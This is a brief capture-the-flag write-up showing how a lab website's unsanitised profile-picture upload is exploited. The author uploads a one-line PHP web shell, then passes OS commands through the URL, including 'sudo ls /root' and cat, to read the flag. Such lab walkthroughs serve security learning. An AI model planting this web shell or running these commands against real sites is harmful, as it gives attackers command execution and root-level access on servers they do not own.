Descriptions:  
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.  
Hints:  
File upload was not sanitized  
Whenever you get a shell on a remote machine, check sudo -l  

Lunch the instance and upload a random file, easy to see, we can upload any file.  
<img width="682" height="160" alt="image" src="https://github.com/user-attachments/assets/a85fed1e-5a20-4190-a19c-bb9577fd48d7" />  
It's using php, so i decide to upload php shell code to check it.  
```php
<?php
system("$_GET[cmd]");
?>
```
Change the path to ` /uploads/<your_file>.php ` and putting some OS command  
<img width="822" height="143" alt="image" src="https://github.com/user-attachments/assets/f1348dab-ed43-4fc6-b6c7-4826f7951668" />  
Our shell code looks fine. Change it a little bit cho access the server.  
`/uploads/<your_file>.php?cmd=sudo ls /root `  
And voila, do you see the flag ? Use `cat` to read it.  

Peace!


